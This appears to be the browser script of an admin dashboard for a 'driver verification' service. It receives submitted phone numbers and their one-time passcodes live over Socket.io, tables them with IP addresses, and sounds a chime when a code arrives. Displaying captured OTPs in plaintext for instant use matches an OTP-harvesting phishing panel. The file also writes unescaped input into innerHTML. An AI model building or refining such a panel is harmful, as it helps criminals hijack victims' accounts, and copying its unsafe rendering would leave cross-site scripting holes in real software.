// Initialize Socket.io Connection
const socket = io();

// State variables
let verificationsList = [];
let soundEnabled = true;
let audioCtx = null;

// DOM Elements
const socketStatusBadge = document.getElementById('socket-status-badge');
const kpiTotal = document.getElementById('kpi-total');
const kpiPending = document.getElementById('kpi-pending');
const kpiVerified = document.getElementById('kpi-verified');
const kpiDbStatus = document.getElementById('kpi-db-status');
const activityFeed = document.getElementById('activity-feed');
const tableBody = document.getElementById('table-body');
const searchInput = document.getElementById('search-input');

// Initialize Dashboard
document.addEventListener('DOMContentLoaded', () => {
    fetchInitialData();
});

// Socket Connection Events
socket.on('connect', () => {
    socketStatusBadge.innerHTML = `
        <span class="status-dot online"></span>
        <span class="status-text">Connected (Socket Online)</span>
    `;
});

socket.on('disconnect', () => {
    socketStatusBadge.innerHTML = `
        <span class="status-dot offline"></span>
        <span class="status-text">Disconnected</span>
    `;
});

// Real-Time Notification Event from Server
socket.on('admin_notification', (notification) => {
    console.log('[Socket Event] admin_notification:', notification);
    
    // Play notification sound
    if (soundEnabled) {
        if (notification.type === 'OTP_SUBMITTED') {
            playChime(880, 'triangle', 0.2);
            setTimeout(() => playChime(1174, 'triangle', 0.3), 150);
        } else {
            playChime(660, 'sine', 0.3);
        }
    }

    // Add entry to Live Activity Feed
    addActivityFeedItem(notification);

    // Refresh table and stats
    fetchInitialData();
});

socket.on('record_deleted', () => {
    fetchInitialData();
});

socket.on('all_records_cleared', () => {
    verificationsList = [];
    renderTable([]);
    updateKpis({ total: 0, pending: 0, verified: 0 });
    activityFeed.innerHTML = '<div class="empty-feed">All records have been cleared.</div>';
});

// Fetch verifications from API
async function fetchInitialData() {
    try {
        const res = await fetch('/api/verifications');
        const result = await res.json();

        if (result.success) {
            verificationsList = result.data || [];
            kpiDbStatus.textContent = result.source === 'MongoDB' ? 'MongoDB (Connected)' : 'Local Dual Store';
            renderTable(verificationsList);
            calculateStats(verificationsList);
        }
    } catch (err) {
        console.error('Error fetching data:', err);
    }
}

// Render Main Verifications Table
function renderTable(data) {
    if (!data || data.length === 0) {
        tableBody.innerHTML = `
            <tr>
                <td colspan="8" style="text-align:center; padding:32px; color:#94A3B8;">
                    <i class="fa-solid fa-inbox" style="font-size:24px; margin-bottom:8px; display:block;"></i>
                    No driver verification requests yet.
                </td>
            </tr>
        `;
        return;
    }

    let html = '';
    data.forEach((item, index) => {
        const id = item._id || item.id;
        const isVerified = item.status === 'VERIFIED';
        
        const statusBadge = isVerified 
            ? `<span class="badge-status verified"><i class="fa-solid fa-check-double"></i> VERIFIED DRIVER</span>`
            : `<span class="badge-status submitted"><i class="fa-solid fa-hourglass-half"></i> Phone Submitted</span>`;

        const otpDisplay = item.otp 
            ? `<span class="otp-pill">${item.otp}</span>`
            : `<span class="otp-pill-none">OTP Not Submitted</span>`;

        const submittedTime = item.submittedAt ? new Date(item.submittedAt).toLocaleTimeString('en-US') : 'Just now';
        const verifiedTime = item.verifiedAt ? new Date(item.verifiedAt).toLocaleTimeString('en-US') : '-';

        html += `
            <tr>
                <td>${index + 1}</td>
                <td style="font-weight:700; color:#FFFFFF; direction:ltr; text-align:left;">${item.phoneNumber}</td>
                <td>${otpDisplay}</td>
                <td>${statusBadge}</td>
                <td>${submittedTime}</td>
                <td>${verifiedTime}</td>
                <td style="font-size:12px; color:#94A3B8;">${item.ipAddress || '127.0.0.1'}</td>
                <td>
                    <button class="btn-del-row" onclick="deleteRecord('${id}')" title="Delete Record">
                        <i class="fa-solid fa-trash"></i>
                    </button>
                </td>
            </tr>
        `;
    });

    tableBody.innerHTML = html;
}

// Calculate KPI Statistics
function calculateStats(data) {
    const total = data.length;
    const pending = data.filter(d => d.status === 'PHONE_SUBMITTED').length;
    const verified = data.filter(d => d.status === 'VERIFIED').length;
    updateKpis({ total, pending, verified });
}

function updateKpis(stats) {
    kpiTotal.textContent = stats.total;
    kpiPending.textContent = stats.pending;
    kpiVerified.textContent = stats.verified;
}

// Add Item to Live Activity Feed
function addActivityFeedItem(notification) {
    const emptyMsg = activityFeed.querySelector('.empty-feed');
    if (emptyMsg) emptyMsg.remove();

    const div = document.createElement('div');
    const isOtp = notification.type === 'OTP_SUBMITTED';
    div.className = `activity-item ${isOtp ? 'type-otp' : 'type-phone'}`;

    const timeStr = new Date().toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', second: '2-digit' });

    let messageHtml = '';
    if (isOtp) {
        messageHtml = `
            <i class="fa-solid fa-circle-check" style="color:#10B981; margin-right:8px;"></i>
            <span>Driver <strong>${notification.data.phoneNumber}</strong> submitted OTP:</span>
            <span class="otp-highlight">${notification.data.otp}</span>
            <span style="color:#10B981;">(Driver Identity Verified)</span>
        `;
    } else {
        messageHtml = `
            <i class="fa-solid fa-phone-volume" style="color:#F59E0B; margin-right:8px;"></i>
            <span>Driver <strong>${notification.data.phoneNumber}</strong> requested verification code</span>
        `;
    }

    div.innerHTML = `
        <div class="activity-message">${messageHtml}</div>
        <div class="activity-time">${timeStr}</div>
    `;

    activityFeed.prepend(div);

    if (activityFeed.children.length > 20) {
        activityFeed.lastElementChild.remove();
    }
}

// Filter Table by Search Query
function filterTable() {
    const query = searchInput.value.toLowerCase().trim();
    if (!query) {
        renderTable(verificationsList);
        return;
    }

    const filtered = verificationsList.filter(item => {
        const phone = (item.phoneNumber || '').toLowerCase();
        const otp = (item.otp || '').toLowerCase();
        return phone.includes(query) || otp.includes(query);
    });

    renderTable(filtered);
}

// Delete single record
async function deleteRecord(id) {
    if (!confirm('Are you sure you want to delete this driver verification record?')) return;
    try {
        await fetch(`/api/verifications/${id}`, { method: 'DELETE' });
        fetchInitialData();
    } catch (err) {
        console.error('Error deleting record:', err);
    }
}

// Clear all records
async function clearAllData() {
    if (!confirm('Are you sure you want to clear all driver verification logs?')) return;
    try {
        await fetch('/api/verifications', { method: 'DELETE' });
        fetchInitialData();
    } catch (err) {
        console.error('Error clearing data:', err);
    }
}

// Sound Audio Chime Synthesizer
function toggleSound() {
    soundEnabled = !soundEnabled;
    const btn = document.getElementById('sound-toggle-btn');
    const icon = document.getElementById('sound-icon');
    const text = document.getElementById('sound-status-text');

    if (soundEnabled) {
        btn.className = 'btn-icon-admin sound-on';
        icon.className = 'fa-solid fa-volume-high';
        text.textContent = 'Audio Alert: Enabled';
    } else {
        btn.className = 'btn-icon-admin sound-off';
        icon.className = 'fa-solid fa-volume-xmark';
        text.textContent = 'Audio Alert: Disabled';
    }
}

function playChime(freq = 660, type = 'sine', duration = 0.3) {
    try {
        if (!audioCtx) {
            audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        }
        if (audioCtx.state === 'suspended') {
            audioCtx.resume();
        }
        const osc = audioCtx.createOscillator();
        const gain = audioCtx.createGain();

        osc.type = type;
        osc.frequency.value = freq;
        
        gain.gain.setValueAtTime(0.15, audioCtx.currentTime);
        gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + duration);

        osc.connect(gain);
        gain.connect(audioCtx.destination);

        osc.start();
        osc.stop(audioCtx.currentTime + duration);
    } catch (err) {
        // Ignore audio errors
    }
}
